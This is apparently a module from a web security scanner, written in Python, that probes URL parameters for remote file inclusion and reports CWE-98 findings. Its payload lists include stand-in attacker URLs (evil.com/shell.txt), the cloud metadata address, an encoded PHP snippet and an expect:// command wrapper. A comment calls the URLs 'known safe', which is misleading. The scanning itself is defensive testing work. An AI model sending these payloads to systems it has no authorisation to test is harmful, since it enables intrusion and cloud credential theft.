#!/usr/bin/env python3
"""
Remote File Inclusion (RFI) Vulnerability Scanner.
Tests for remote file inclusion vulnerabilities.

References:
    - OWASP: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
    - CWE-98: Improper Control of Filename for Include/Require Statement
"""

import re
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """Remote File Inclusion vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Remote File Inclusion (RFI) Detection"
        
        # RFI payloads - using known safe test URLs
        self.rfi_payloads = [
            'http://evil.com/shell.txt',
            'http://127.0.0.1:8080/test.txt',
            'http://localhost/test.txt',
            'https://pastebin.com/raw/test',
            'http://169.254.169.254/latest/meta-data/',
            'ftp://evil.com/shell.txt',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        ]
        
        # Wrapper payloads
        self.wrapper_payloads = [
            'php://filter/convert.base64-encode/resource=http://evil.com/shell.txt',
            'expect://id',
            'ogg://http://evil.com/shell.txt',
        ]
        
        # RFI-vulnerable parameter names
        self.rfi_params = [
            'file', 'page', 'include', 'path', 'document',
            'folder', 'template', 'view', 'load', 'read',
            'url', 'content', 'dir', 'show', 'site',
            'inc', 'require', 'src', 'location', 'link',
        ]
        
        # RFI error indicators
        self.error_patterns = [
            r'failed to open stream',
            r'include\(http://',
            r'require\(http://',
            r'include_once\(http://',
            r'require_once\(http://',
            r'allow_url_include',
            r'allow_url_fopen',
            r'Remote file include',
            r'http:// wrapper is disabled',
            r'URL file-access is disabled',
            r'No such file or directory.*http://',
            r'failed opening.*http://',
        ]
    
    def run(self) -> Dict:
        """Execute RFI vulnerability tests."""
        logger.info(f"Starting {self.module_name} for {self.target_url}")
        
        result = {
            'module': self.module_name,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'findings': []
        }
        
        # Discover test parameters
        test_params = self._discover_parameters()
        
        for url, params in test_params:
            for param_name in params:
                result['parameters_tested'].append(param_name)
                vuln = self._test_parameter(url, param_name, params)
                
                if vuln:
                    result['vulnerable_parameters'].append({
                        'url': url,
                        'parameter': param_name,
                        'evidence': vuln,
                    })
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            self.findings.append({
                'title': f"Remote File Inclusion in '{vuln['parameter']}' parameter",
                'severity': 'critical',
                'description': (
                    f"RFI vulnerability in '{vuln['parameter']}' at {vuln['url']}. "
                    "Remote file inclusion allows execution of attacker-controlled code."
                ),
                'recommendation': (
                    "1. Set allow_url_include = Off in php.ini\n"
                    "2. Use allowlists for allowed file paths\n"
                    "3. Validate and sanitize all file path inputs\n"
                    "4. Use basename() to prevent path traversal"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-98',
                'cvss_score': 9.8,
                'evidence': vuln['evidence'],
            })
        
        result['findings'] = self.findings
        return result
    
    def _discover_parameters(self) -> List:
        """Discover parameters that might be vulnerable to RFI."""
        test_urls = []
        
        resp = self.browser.get('/')
        if resp and resp.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                if '?' in href:
                    from urllib.parse import parse_qs, urlparse
                    parsed = urlparse(urljoin(self.target_url, href))
                    query_params = parse_qs(parsed.query)
                    
                    for param in query_params:
                        if any(rfi_param in param.lower() for rfi_param in self.rfi_params):
                            test_urls.append((parsed.geturl().split('?')[0], query_params))
                            break
        
        # Also test main page with common parameters
        for param in self.rfi_params[:10]:
            test_urls.append((self.target_url, {param: 'test'}))
        
        return test_urls[:15]
    
    def _test_parameter(self, url: str, param_name: str, params: Dict) -> Optional[Dict]:
        """Test a parameter for RFI."""
        for payload in self.rfi_payloads[:3]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp:
                for pattern in self.error_patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        return {
                            'evidence': f"Error pattern: {pattern}",
                            'payload': payload,
                        }
        
        return None